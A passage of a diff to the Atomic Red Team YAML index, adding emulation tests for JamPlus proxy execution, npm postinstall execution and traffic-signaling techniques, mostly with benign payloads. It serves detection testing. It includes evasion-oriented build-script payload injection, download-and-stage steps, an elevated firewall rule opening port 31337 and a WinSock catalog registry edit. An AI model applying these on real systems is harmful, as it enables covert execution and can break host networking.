+            $jambase = Get-ChildItem -Path $extractDir -Recurse -Filter "Jambase.jam" | Select-Object -First 1
+            if ($jambase) {
+              Copy-Item $jambase.FullName (Join-Path $jamDir "Jambase.jam") -Force
+            } else {
+              Write-Warning "Jambase.jam was not found anywhere in the extracted archive. JamPlus will fail to parse Jamfiles until this is resolved."
+            }
+          }
+      executor:
+        name: powershell
+        command: |
+          New-Item -ItemType Directory -Path "#{work_dir}" -Force | Out-Null
+          @"
+          actions RunPayload
+          {
+              powershell.exe -NoProfile -Command "Set-Content -Path '#{marker_file}' -Value 'T1127.003 test'"
+          }
+          RunPayload payload ;
+          NotFile payload ;
+          Always payload ;
+          Depends all : payload ;
+          "@ | Set-Content -Path "#{work_dir}\Jamfile.jam"
+          Push-Location "#{work_dir}"
+          & "#{jam_path}"
+          Pop-Location
+        cleanup_command: |
+          Remove-Item -Recurse -Force "#{work_dir}" -ErrorAction Ignore
+          Remove-Item "#{marker_file}" -Force -ErrorAction Ignore
+    - name: JamPlus proxy execution - payload injected via command-line variable substitution
+      auto_generated_guid: 077fb22c-fe92-4abd-aecf-31339324864b
+      description: |
+        Writes an innocuous-looking Jamfile.jam whose action body only references a variable, with no payload embedded in the file itself. The actual command is supplied entirely via a jam -s command-line variable at invocation time, so the Jamfile would pass a static content review while the executed command is assembled only at runtime. Simulates a supply-chain-style abuse pattern where a pre-approved, benign-looking build script is weaponized purely through its invocation parameters.
+        Expected output: calc.exe launches as a child process of jam.exe, despite the Jamfile containing no reference to calc.exe.
+      supported_platforms:
+      - windows
+      input_arguments:
+        jam_path:
+          description: Path to the JamPlus executable (jam.exe)
+          type: path
+          default: C:\JamPlus\jam.exe
+        work_dir:
+          description: Scratch directory to build the Jamfile.jam in
+          type: path
+          default: "$env:TEMP\\T1127.003_test3b"
+        payload_command:
+          description: Command injected at invocation time via the PAYLOAD variable
+          type: string
+          default: calc.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: JamPlus (jam.exe) and its required Jambase.jam must both exist
+          at the specified path
+        prereq_command: |
+          $jamDir = Split-Path "#{jam_path}"
+          if ((Test-Path "#{jam_path}") -and (Test-Path (Join-Path $jamDir "Jambase.jam"))) { exit 0 } else { exit 1 }
+        get_prereq_command: 'Write-Host "Run test 1''s get_prereq_command first to
+          install JamPlus and Jambase.jam."
+
+          '
+      executor:
+        name: powershell
+        command: |
+          New-Item -ItemType Directory -Path "#{work_dir}" -Force | Out-Null
+          @'
+          actions RunPayload
+          {
+              $(PAYLOAD)
+          }
+          RunPayload payload ;
+          NotFile payload ;
+          Always payload ;
+          Depends all : payload ;
+          '@ | Set-Content -Path "#{work_dir}\Jamfile.jam"
+          Push-Location "#{work_dir}"
+          & "#{jam_path}" -s"PAYLOAD=#{payload_command}" payload
+          Pop-Location
+        cleanup_command: 'Remove-Item -Recurse -Force "#{work_dir}" -ErrorAction Ignore
+
+          '
+    - name: JamPlus proxy execution - command execution via explicitly named Jamfile
+      auto_generated_guid: cab43461-dbf0-4786-a9bc-857067272f8d
+      description: |
+        Writes a build-instructions file under a non-default filename and invokes JamPlus against it explicitly using the -f flag, rather than relying on JamPlus's default Jamfile.jam auto-discovery. Demonstrates a distinct invocation path that may evade detections keyed only on the default filename.
+        Expected output: notepad.exe launches as a child process of jam.exe.
+      supported_platforms:
+      - windows
+      input_arguments:
+        jam_path:
+          description: Path to the JamPlus executable (jam.exe)
+          type: path
+          default: C:\JamPlus\jam.exe
+        work_dir:
+          description: Scratch directory to build the custom jam file in
+          type: path
+          default: "$env:TEMP\\T1127.003_test4b"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: JamPlus (jam.exe) and its required Jambase.jam must both exist
+          at the specified path
+        prereq_command: |
+          $jamDir = Split-Path "#{jam_path}"
+          if ((Test-Path "#{jam_path}") -and (Test-Path (Join-Path $jamDir "Jambase.jam"))) { exit 0 } else { exit 1 }
+        get_prereq_command: 'Write-Host "Run test 1''s get_prereq_command first to
+          install JamPlus and Jambase.jam."
+
+          '
+      executor:
+        name: powershell
+        command: |
+          New-Item -ItemType Directory -Path "#{work_dir}" -Force | Out-Null
+          @'
+          actions RunPayload
+          {
+              cmd.exe /c start "" notepad.exe
+          }
+          RunPayload payload ;
+          NotFile payload ;
+          Always payload ;
+          Depends all : payload ;
+          '@ | Set-Content -Path "#{work_dir}\build_instructions.jam"
+          Push-Location "#{work_dir}"
+          & "#{jam_path}" -f build_instructions.jam payload
+          Pop-Location
+        cleanup_command: |
+          Get-Process notepad -ErrorAction Ignore | Stop-Process -Force -ErrorAction Ignore
+          Remove-Item -Recurse -Force "#{work_dir}" -ErrorAction Ignore
+    - name: JamPlus proxy execution - payload download and execute via jam build action
+      auto_generated_guid: 424b5096-2c96-44a0-a48f-ef66bb9d5638
+      description: |
+        Writes a Jamfile.jam whose build action downloads a benign file from a local/looped-back source and writes it to disk via jam, simulating the download-and-stage step adversaries perform before executing a second-stage payload through JamPlus, without actually executing attacker-controlled content.
+        Expected output: a file is retrieved and written to disk by a process spawned from jam.exe.
+      supported_platforms:
+      - windows
+      input_arguments:
+        jam_path:
+          description: Path to the JamPlus executable (jam.exe)
+          type: path
+          default: C:\JamPlus\jam.exe
+        work_dir:
+          description: Scratch directory to build the Jamfile.jam in
+          type: path
+          default: "$env:TEMP\\T1127.003_test5"
+        staged_file:
+          description: Path the proxied process will write to
+          type: path
+          default: "$env:TEMP\\T1127.003_staged.txt"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: JamPlus (jam.exe) and its required Jambase.jam must both exist
+          at the specified path
+        prereq_command: |
+          $jamDir = Split-Path "#{jam_path}"
+          if ((Test-Path "#{jam_path}") -and (Test-Path (Join-Path $jamDir "Jambase.jam"))) { exit 0 } else { exit 1 }
+        get_prereq_command: |
+          $releaseInfo = Invoke-RestMethod -Uri "https://api.github.com/repos/jamplus/jamplus/releases/latest" -UseBasicParsing
+          $asset = $releaseInfo.assets | Where-Object { $_.name -like "*win*" -and $_.name -like "*.zip" } | Select-Object -First 1
+          if (-not $asset) { $asset = $releaseInfo.assets | Where-Object { $_.name -like "*.zip" } | Select-Object -First 1 }
+          $zipPath = "$env:TEMP\jamplus.zip"
+          Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $zipPath -UseBasicParsing
+          $extractDir = Split-Path "#{jam_path}"
+          New-Item -ItemType Directory -Path $extractDir -Force | Out-Null
+          Expand-Archive -Path $zipPath -DestinationPath $extractDir -Force
+          Remove-Item $zipPath -Force
+          if (-not (Test-Path "#{jam_path}")) {
+            $found = Get-ChildItem -Path $extractDir -Recurse -Filter "jam.exe" | Select-Object -First 1
+            if ($found) { Move-Item $found.FullName "#{jam_path}" -Force }
+          }
+          $jamDir = Split-Path "#{jam_path}"
+          if (-not (Test-Path (Join-Path $jamDir "Jambase.jam"))) {
+            $jambase = Get-ChildItem -Path $extractDir -Recurse -Filter "Jambase.jam" | Select-Object -First 1
+            if ($jambase) {
+              Copy-Item $jambase.FullName (Join-Path $jamDir "Jambase.jam") -Force
+            } else {
+              Write-Warning "Jambase.jam was not found anywhere in the extracted archive. JamPlus will fail to parse Jamfiles until this is resolved."
+            }
+          }
+      executor:
+        name: powershell
+        command: |
+          New-Item -ItemType Directory -Path "#{work_dir}" -Force | Out-Null
+          @"
+          actions Stage
+          {
+              powershell.exe -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/README.md' -OutFile '#{staged_file}' -UseBasicParsing"
+          }
+          Stage payload ;
+          NotFile payload ;
+          Always payload ;
+          Depends all : payload ;
+          "@ | Set-Content -Path "#{work_dir}\Jamfile.jam"
+          Push-Location "#{work_dir}"
+          & "#{jam_path}"
+          Pop-Location
+        cleanup_command: |
+          Remove-Item -Recurse -Force "#{work_dir}" -ErrorAction Ignore
+          Remove-Item "#{staged_file}" -Force -ErrorAction Ignore
   T1542:
     technique:
       type: attack-pattern
@@ -33587,7 +34422,7 @@ execution:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-05-22T21:22:40.822Z'
-      name: Malicious Library
+      name: 'User Execution: Malicious Library'
       description: |-
         Adversaries may rely on a user installing a malicious library to facilitate execution. Threat actors may [Upload Malware](https://attack.mitre.org/techniques/T1608/001) to package managers such as NPM and PyPi, as well as to public code repositories such as GitHub. User may install libraries without realizing they are malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that establishes persistence, steals data, or mines cryptocurrency.(Citation: Datadog Security Labs Malicious PyPi Packages 2024)(Citation: Fortinet Malicious NPM Packages 2023)
 
@@ -33607,7 +34442,131 @@ execution:
       - Windows
       x_mitre_version: '1.0'
       x_mitre_remote_support: false
-    atomic_tests: []
+      identifier: T1204.005
+    atomic_tests:
+    - name: Execute a synthetic npm package postinstall script
+      auto_generated_guid: 57e78bad-45f6-42f4-ad5b-705576394ca2
+      description: |
+        Simulates user execution of a malicious library by installing a local, synthetic npm package whose
+        `postinstall` lifecycle script executes JavaScript and creates a harmless marker file. This behavior
+        represents the package-install execution pattern associated with malicious npm packages and campaigns
+        such as the DPRK-linked Contagious Interview activity.
+
+        The test does not contact an npm registry, download code, collect credentials, establish persistence,
+        or execute an operator-supplied payload. Expected output includes npm reporting execution of the
+        package's `postinstall` script, creation of the T1204.005 marker file, and a success message containing
+        the marker contents.
+
+        References:
+
+        - https://attack.mitre.org/techniques/T1204/005/
+        - https://cloud.google.com/blog/topics/threat-intelligence/mitigation-guidance-for-supply-chain-compromise
+      supported_platforms:
+      - windows
+      input_arguments:
+        npm_path:
+          description: npm command or full path to npm.cmd
+          type: path
+          default: npm.cmd
+        package_path:
+          description: Path to the local synthetic npm package included with this
+            atomic
+          type: path
+          default: PathToAtomicsFolder\T1204.005\src\atomic-npm-package
+        working_directory:
+          description: Disposable directory used for the local npm installation and
+            cache
+          type: path
+          default: "$env:TEMP\\T1204.005-Atomic-Npm"
+        marker_path:
+          description: Marker file created by the synthetic package postinstall script
+          type: path
+          default: "$env:TEMP\\T1204.005-Atomic-Npm\\T1204.005-npm-postinstall.txt"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Node.js and npm must be installed and the configured npm command
+          must be available.
+
+          '
+        prereq_command: |
+          $npmPath = [Environment]::ExpandEnvironmentVariables("#{npm_path}")
+          if (Get-Command $npmPath -ErrorAction SilentlyContinue) { exit 0 }
+          exit 1
+        get_prereq_command: 'Write-Host ''Install a supported Node.js release from
+          https://nodejs.org/ and ensure npm.cmd is available in PATH.''
+
+          '
+      - description: 'The synthetic npm package source files must exist in the configured
+          package directory.
+
+          '
+        prereq_command: |
+          $packagePath = [Environment]::ExpandEnvironmentVariables("#{package_path}")
+          $packageJson = Join-Path $packagePath 'package.json'
+          $postinstallScript = Join-Path $packagePath 'postinstall.js'
+          if ((Test-Path -LiteralPath $packageJson -PathType Leaf) -and (Test-Path -LiteralPath $postinstallScript -PathType Leaf)) { exit 0 }
+          exit 1
+        get_prereq_command: 'Write-Host ''Restore package.json and postinstall.js
+          under T1204.005\src\atomic-npm-package.''
+
+          '
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $ErrorActionPreference = 'Stop'
+          $npmPath = [Environment]::ExpandEnvironmentVariables("#{npm_path}")
+          $packagePath = [Environment]::ExpandEnvironmentVariables("#{package_path}")
+          $workingDirectory = [Environment]::ExpandEnvironmentVariables("#{working_directory}")
+          $markerPath = [Environment]::ExpandEnvironmentVariables("#{marker_path}")
+
+          if (Test-Path -LiteralPath $workingDirectory) {
+            throw "Refusing to use pre-existing working directory: $workingDirectory"
+          }
+
+          New-Item -ItemType Directory -Path $workingDirectory -Force | Out-Null
+          $env:ART_T1204_005_MARKER = $markerPath
+
+          try {
+            $npmArguments = @(
+              'install'
+              $packagePath
+              '--prefix', $workingDirectory
+              '--cache', (Join-Path $workingDirectory '.npm-cache')
+              '--no-audit'
+              '--no-fund'
+              '--ignore-scripts=false'
+              '--foreground-scripts'
+            )
+
+            & $npmPath @npmArguments
+            $npmExitCode = $LASTEXITCODE
+
+            if ($npmExitCode -ne 0) {
+              throw "npm install failed with exit code $npmExitCode"
+            }
+
+            if (-not (Test-Path -LiteralPath $markerPath -PathType Leaf)) {
+              throw "npm completed without creating the expected marker: $markerPath"
+            }
+
+            $markerContent = Get-Content -LiteralPath $markerPath -Raw
+            if ($markerContent -notmatch 'Atomic Red Team T1204\.005') {
+              throw 'The marker file did not contain the expected Atomic Red Team identifier.'
+            }
+
+            Write-Host 'T1204.005 synthetic npm postinstall execution succeeded.'
+            Write-Output $markerContent.Trim()
+          }
+          finally {
+            Remove-Item Env:\ART_T1204_005_MARKER -ErrorAction SilentlyContinue
+          }
+        cleanup_command: |
+          $workingDirectory = [Environment]::ExpandEnvironmentVariables("#{working_directory}")
+          $markerPath = [Environment]::ExpandEnvironmentVariables("#{marker_path}")
+          Remove-Item Env:\ART_T1204_005_MARKER -ErrorAction SilentlyContinue
+          Remove-Item -LiteralPath $markerPath -Force -ErrorAction SilentlyContinue
+          Remove-Item -LiteralPath $workingDirectory -Recurse -Force -ErrorAction SilentlyContinue
   T1677:
     technique:
       type: attack-pattern
@@ -33789,7 +34748,7 @@ execution:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.645Z'
-      name: JamPlus
+      name: 'Trusted Developer Utilities Proxy Execution: JamPlus'
       description: |-
         Adversaries may use `JamPlus` to proxy the execution of a malicious script. `JamPlus` is a build utility tool for code and data build systems. It works with several popular compilers and can be used for generating workspaces in code editors such as Visual Studio.(Citation: JamPlus manual)
 
@@ -33809,7 +34768,312 @@ execution:
       - Windows
       x_mitre_version: '2.0'
       x_mitre_remote_support: false
-    atomic_tests: []
+      identifier: T1127.003
+    atomic_tests:
+    - name: JamPlus proxy execution - launch calc.exe via Jamfile.jam action
+      auto_generated_guid: 5f7f863b-b6e5-4eb3-98af-9844d194137e
+      description: |
+        Writes a minimal Jamfile.jam whose build action shell-executes calc.exe, then invokes jam.exe against it. Mirrors the reported abuse pattern of using JamPlus's build actions to proxy execution of an arbitrary binary from a reputable developer tool.
+        Expected output: calc.exe launches as a child process of jam.exe.
+      supported_platforms:
+      - windows
+      input_arguments:
+        jam_path:
+          description: Path to the JamPlus executable (jam.exe)
+          type: path
+          default: C:\JamPlus\jam.exe
+        work_dir:
+          description: Scratch directory to build the Jamfile.jam in
+          type: path
+          default: "$env:TEMP\\T1127.003_test1"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: JamPlus (jam.exe) and its required Jambase.jam must both exist
+          at the specified path
+        prereq_command: |
+          $jamDir = Split-Path "#{jam_path}"
+          if ((Test-Path "#{jam_path}") -and (Test-Path (Join-Path $jamDir "Jambase.jam"))) { exit 0 } else { exit 1 }
+        get_prereq_command: |
+          $releaseInfo = Invoke-RestMethod -Uri "https://api.github.com/repos/jamplus/jamplus/releases/latest" -UseBasicParsing
+          $asset = $releaseInfo.assets | Where-Object { $_.name -like "*win*" -and $_.name -like "*.zip" } | Select-Object -First 1
+          if (-not $asset) { $asset = $releaseInfo.assets | Where-Object { $_.name -like "*.zip" } | Select-Object -First 1 }
+          $zipPath = "$env:TEMP\jamplus.zip"
+          Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $zipPath -UseBasicParsing
+          $extractDir = Split-Path "#{jam_path}"
+          New-Item -ItemType Directory -Path $extractDir -Force | Out-Null
+          Expand-Archive -Path $zipPath -DestinationPath $extractDir -Force
+          Remove-Item $zipPath -Force
+          if (-not (Test-Path "#{jam_path}")) {
+            $found = Get-ChildItem -Path $extractDir -Recurse -Filter "jam.exe" | Select-Object -First 1
+            if ($found) { Move-Item $found.FullName "#{jam_path}" -Force }
+          }
+          $jamDir = Split-Path "#{jam_path}"
+          if (-not (Test-Path (Join-Path $jamDir "Jambase.jam"))) {
+            $jambase = Get-ChildItem -Path $extractDir -Recurse -Filter "Jambase.jam" | Select-Object -First 1
+            if ($jambase) {
+              Copy-Item $jambase.FullName (Join-Path $jamDir "Jambase.jam") -Force
+            } else {
+              Write-Warning "Jambase.jam was not found anywhere in the extracted archive. JamPlus will fail to parse Jamfiles until this is resolved."
+            }
+          }
+      executor:
+        name: powershell
+        command: |
+          New-Item -ItemType Directory -Path "#{work_dir}" -Force | Out-Null
+          @'
+          actions RunPayload
+          {
+              calc.exe
+          }
+          RunPayload payload ;
+          NotFile payload ;
+          Always payload ;
+          Depends all : payload ;
+          '@ | Set-Content -Path "#{work_dir}\Jamfile.jam"
+          Push-Location "#{work_dir}"
+          & "#{jam_path}"
+          Pop-Location
+        cleanup_command: 'Remove-Item -Recurse -Force "#{work_dir}" -ErrorAction Ignore
+
+          '
+    - name: JamPlus proxy execution - launch PowerShell via Jamfile.jam action
+      auto_generated_guid: 51b6913b-f96a-4d18-9802-41d4c5d4f995
+      description: |
+        Writes a Jamfile.jam whose build action invokes powershell.exe to write a marker file, simulating an adversary using JamPlus to proxy execution of a PowerShell payload rather than a GUI binary.
+        Expected output: a marker file is created by the powershell.exe process spawned from jam.exe.
+      supported_platforms:
+      - windows
+      input_arguments:
+        jam_path:
+          description: Path to the JamPlus executable (jam.exe)
+          type: path
+          default: C:\JamPlus\jam.exe
+        work_dir:
+          description: Scratch directory to build the Jamfile.jam in
+          type: path
+          default: "$env:TEMP\\T1127.003_test2"
+        marker_file:
+          description: File the proxied PowerShell process will create
+          type: path
+          default: "$env:TEMP\\T1127.003_marker.txt"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: JamPlus (jam.exe) and its required Jambase.jam must both exist
+          at the specified path
+        prereq_command: |
+          $jamDir = Split-Path "#{jam_path}"
+          if ((Test-Path "#{jam_path}") -and (Test-Path (Join-Path $jamDir "Jambase.jam"))) { exit 0 } else { exit 1 }
+        get_prereq_command: |
+          $releaseInfo = Invoke-RestMethod -Uri "https://api.github.com/repos/jamplus/jamplus/releases/latest" -UseBasicParsing
+          $asset = $releaseInfo.assets | Where-Object { $_.name -like "*win*" -and $_.name -like "*.zip" } | Select-Object -First 1
+          if (-not $asset) { $asset = $releaseInfo.assets | Where-Object { $_.name -like "*.zip" } | Select-Object -First 1 }
+          $zipPath = "$env:TEMP\jamplus.zip"
+          Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $zipPath -UseBasicParsing
+          $extractDir = Split-Path "#{jam_path}"
+          New-Item -ItemType Directory -Path $extractDir -Force | Out-Null
+          Expand-Archive -Path $zipPath -DestinationPath $extractDir -Force
+          Remove-Item $zipPath -Force
+          if (-not (Test-Path "#{jam_path}")) {
+            $found = Get-ChildItem -Path $extractDir -Recurse -Filter "jam.exe" | Select-Object -First 1
+            if ($found) { Move-Item $found.FullName "#{jam_path}" -Force }
+          }
+          $jamDir = Split-Path "#{jam_path}"
+          if (-not (Test-Path (Join-Path $jamDir "Jambase.jam"))) {
+            $jambase = Get-ChildItem -Path $extractDir -Recurse -Filter "Jambase.jam" | Select-Object -First 1
+            if ($jambase) {
+              Copy-Item $jambase.FullName (Join-Path $jamDir "Jambase.jam") -Force
+            } else {
+              Write-Warning "Jambase.jam was not found anywhere in the extracted archive. JamPlus will fail to parse Jamfiles until this is resolved."
+            }
+          }
+      executor:
+        name: powershell
+        command: |
+          New-Item -ItemType Directory -Path "#{work_dir}" -Force | Out-Null
+          @"
+          actions RunPayload
+          {
+              powershell.exe -NoProfile -Command "Set-Content -Path '#{marker_file}' -Value 'T1127.003 test'"
+          }
+          RunPayload payload ;
+          NotFile payload ;
+          Always payload ;
+          Depends all : payload ;
+          "@ | Set-Content -Path "#{work_dir}\Jamfile.jam"
+          Push-Location "#{work_dir}"
+          & "#{jam_path}"
+          Pop-Location
+        cleanup_command: |
+          Remove-Item -Recurse -Force "#{work_dir}" -ErrorAction Ignore
+          Remove-Item "#{marker_file}" -Force -ErrorAction Ignore
+    - name: JamPlus proxy execution - payload injected via command-line variable substitution
+      auto_generated_guid: 077fb22c-fe92-4abd-aecf-31339324864b
+      description: |
+        Writes an innocuous-looking Jamfile.jam whose action body only references a variable, with no payload embedded in the file itself. The actual command is supplied entirely via a jam -s command-line variable at invocation time, so the Jamfile would pass a static content review while the executed command is assembled only at runtime. Simulates a supply-chain-style abuse pattern where a pre-approved, benign-looking build script is weaponized purely through its invocation parameters.
+        Expected output: calc.exe launches as a child process of jam.exe, despite the Jamfile containing no reference to calc.exe.
+      supported_platforms:
+      - windows
+      input_arguments:
+        jam_path:
+          description: Path to the JamPlus executable (jam.exe)
+          type: path
+          default: C:\JamPlus\jam.exe
+        work_dir:
+          description: Scratch directory to build the Jamfile.jam in
+          type: path
+          default: "$env:TEMP\\T1127.003_test3b"
+        payload_command:
+          description: Command injected at invocation time via the PAYLOAD variable
+          type: string
+          default: calc.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: JamPlus (jam.exe) and its required Jambase.jam must both exist
+          at the specified path
+        prereq_command: |
+          $jamDir = Split-Path "#{jam_path}"
+          if ((Test-Path "#{jam_path}") -and (Test-Path (Join-Path $jamDir "Jambase.jam"))) { exit 0 } else { exit 1 }
+        get_prereq_command: 'Write-Host "Run test 1''s get_prereq_command first to
+          install JamPlus and Jambase.jam."
+
+          '
+      executor:
+        name: powershell
+        command: |
+          New-Item -ItemType Directory -Path "#{work_dir}" -Force | Out-Null
+          @'
+          actions RunPayload
+          {
+              $(PAYLOAD)
+          }
+          RunPayload payload ;
+          NotFile payload ;
+          Always payload ;
+          Depends all : payload ;
+          '@ | Set-Content -Path "#{work_dir}\Jamfile.jam"
+          Push-Location "#{work_dir}"
+          & "#{jam_path}" -s"PAYLOAD=#{payload_command}" payload
+          Pop-Location
+        cleanup_command: 'Remove-Item -Recurse -Force "#{work_dir}" -ErrorAction Ignore
+
+          '
+    - name: JamPlus proxy execution - command execution via explicitly named Jamfile
+      auto_generated_guid: cab43461-dbf0-4786-a9bc-857067272f8d
+      description: |
+        Writes a build-instructions file under a non-default filename and invokes JamPlus against it explicitly using the -f flag, rather than relying on JamPlus's default Jamfile.jam auto-discovery. Demonstrates a distinct invocation path that may evade detections keyed only on the default filename.
+        Expected output: notepad.exe launches as a child process of jam.exe.
+      supported_platforms:
+      - windows
+      input_arguments:
+        jam_path:
+          description: Path to the JamPlus executable (jam.exe)
+          type: path
+          default: C:\JamPlus\jam.exe
+        work_dir:
+          description: Scratch directory to build the custom jam file in
+          type: path
+          default: "$env:TEMP\\T1127.003_test4b"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: JamPlus (jam.exe) and its required Jambase.jam must both exist
+          at the specified path
+        prereq_command: |
+          $jamDir = Split-Path "#{jam_path}"
+          if ((Test-Path "#{jam_path}") -and (Test-Path (Join-Path $jamDir "Jambase.jam"))) { exit 0 } else { exit 1 }
+        get_prereq_command: 'Write-Host "Run test 1''s get_prereq_command first to
+          install JamPlus and Jambase.jam."
+
+          '
+      executor:
+        name: powershell
+        command: |
+          New-Item -ItemType Directory -Path "#{work_dir}" -Force | Out-Null
+          @'
+          actions RunPayload
+          {
+              cmd.exe /c start "" notepad.exe
+          }
+          RunPayload payload ;
+          NotFile payload ;
+          Always payload ;
+          Depends all : payload ;
+          '@ | Set-Content -Path "#{work_dir}\build_instructions.jam"
+          Push-Location "#{work_dir}"
+          & "#{jam_path}" -f build_instructions.jam payload
+          Pop-Location
+        cleanup_command: |
+          Get-Process notepad -ErrorAction Ignore | Stop-Process -Force -ErrorAction Ignore
+          Remove-Item -Recurse -Force "#{work_dir}" -ErrorAction Ignore
+    - name: JamPlus proxy execution - payload download and execute via jam build action
+      auto_generated_guid: 424b5096-2c96-44a0-a48f-ef66bb9d5638
+      description: |
+        Writes a Jamfile.jam whose build action downloads a benign file from a local/looped-back source and writes it to disk via jam, simulating the download-and-stage step adversaries perform before executing a second-stage payload through JamPlus, without actually executing attacker-controlled content.
+        Expected output: a file is retrieved and written to disk by a process spawned from jam.exe.
+      supported_platforms:
+      - windows
+      input_arguments:
+        jam_path:
+          description: Path to the JamPlus executable (jam.exe)
+          type: path
+          default: C:\JamPlus\jam.exe
+        work_dir:
+          description: Scratch directory to build the Jamfile.jam in
+          type: path
+          default: "$env:TEMP\\T1127.003_test5"
+        staged_file:
+          description: Path the proxied process will write to
+          type: path
+          default: "$env:TEMP\\T1127.003_staged.txt"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: JamPlus (jam.exe) and its required Jambase.jam must both exist
+          at the specified path
+        prereq_command: |
+          $jamDir = Split-Path "#{jam_path}"
+          if ((Test-Path "#{jam_path}") -and (Test-Path (Join-Path $jamDir "Jambase.jam"))) { exit 0 } else { exit 1 }
+        get_prereq_command: |
+          $releaseInfo = Invoke-RestMethod -Uri "https://api.github.com/repos/jamplus/jamplus/releases/latest" -UseBasicParsing
+          $asset = $releaseInfo.assets | Where-Object { $_.name -like "*win*" -and $_.name -like "*.zip" } | Select-Object -First 1
+          if (-not $asset) { $asset = $releaseInfo.assets | Where-Object { $_.name -like "*.zip" } | Select-Object -First 1 }
+          $zipPath = "$env:TEMP\jamplus.zip"
+          Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $zipPath -UseBasicParsing
+          $extractDir = Split-Path "#{jam_path}"
+          New-Item -ItemType Directory -Path $extractDir -Force | Out-Null
+          Expand-Archive -Path $zipPath -DestinationPath $extractDir -Force
+          Remove-Item $zipPath -Force
+          if (-not (Test-Path "#{jam_path}")) {
+            $found = Get-ChildItem -Path $extractDir -Recurse -Filter "jam.exe" | Select-Object -First 1
+            if ($found) { Move-Item $found.FullName "#{jam_path}" -Force }
+          }
+          $jamDir = Split-Path "#{jam_path}"
+          if (-not (Test-Path (Join-Path $jamDir "Jambase.jam"))) {
+            $jambase = Get-ChildItem -Path $extractDir -Recurse -Filter "Jambase.jam" | Select-Object -First 1
+            if ($jambase) {
+              Copy-Item $jambase.FullName (Join-Path $jamDir "Jambase.jam") -Force
+            } else {
+              Write-Warning "Jambase.jam was not found anywhere in the extracted archive. JamPlus will fail to parse Jamfiles until this is resolved."
+            }
+          }
+      executor:
+        name: powershell
+        command: |
+          New-Item -ItemType Directory -Path "#{work_dir}" -Force | Out-Null
+          @"
+          actions Stage
+          {
+              powershell.exe -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/README.md' -OutFile '#{staged_file}' -UseBasicParsing"
+          }
+          Stage payload ;
+          NotFile payload ;
+          Always payload ;
+          Depends all : payload ;
+          "@ | Set-Content -Path "#{work_dir}\Jamfile.jam"
+          Push-Location "#{work_dir}"
+          & "#{jam_path}"
+          Pop-Location
+        cleanup_command: |
+          Remove-Item -Recurse -Force "#{work_dir}" -ErrorAction Ignore
+          Remove-Item "#{staged_file}" -Force -ErrorAction Ignore
   T1569.001:
     technique:
       type: attack-pattern
@@ -38286,7 +39550,7 @@ persistence:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.619Z'
-      name: Socket Filters
+      name: 'Traffic Signaling: Socket Filters'
       description: |-
         Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.
 
@@ -38314,7 +39578,203 @@ persistence:
       - macOS
       - Windows
       x_mitre_version: '2.0'
-    atomic_tests: []
+      identifier: T1205.002
+    atomic_tests:
+    - name: T1205.002 - Add Custom Firewall Rule for Traffic Signaling Simulation
+      auto_generated_guid: c33f6e7b-87f9-45be-be0e-8eaa0616034d
+      description: 'Simulates an adversary creating a custom inbound firewall rule
+        designed to act as a traffic signaling trigger for backdoor activation.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: New-NetFirewallRule -DisplayName "T1205_Signal_Knock_Rule" -Direction
+          Inbound -Protocol TCP -LocalPort 31337 -Action Allow -Description "Simulated
+          traffic signaling trigger rule"; Write-Host "[+] Simulated port knocking
+          signal rule created."
+        cleanup_command: Remove-NetFirewallRule -DisplayName "T1205_Signal_Knock_Rule"
+          -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up signal firewall
+          rule."
+    - name: T1205.002 - Register Custom WinSock Protocol Catalog Entry
+      auto_generated_guid: 90fd1078-149b-4da4-b0f7-1113030dd8ae
+      description: 'Simulates an adversary modifying WinSock protocol catalogs (`Protocol_Catalog9`)
+        to register a custom packet interception provider.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog
+          Entries\000000000099" -Force; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog
+          Entries\000000000099" -Name "PackedCatalogItem" -Value ([byte[]](0..31))
+          -ErrorAction SilentlyContinue; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog
+          Entries\000000000099" -Name "DisplayName" -Value "Simulated Filter Provider"
+          -ErrorAction SilentlyContinue; Write-Host "[+] Simulated WinSock protocol
+          catalog modification executed."
+        cleanup_command: Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog
+          Entries\000000000099" -Recurse -Force -ErrorAction SilentlyContinue; Write-Host
+          "[+] Cleaned up simulated WinSock catalog entry."
+    - name: T1205.002 - Register Custom WinSock Name Space Provider (NSP) Stub
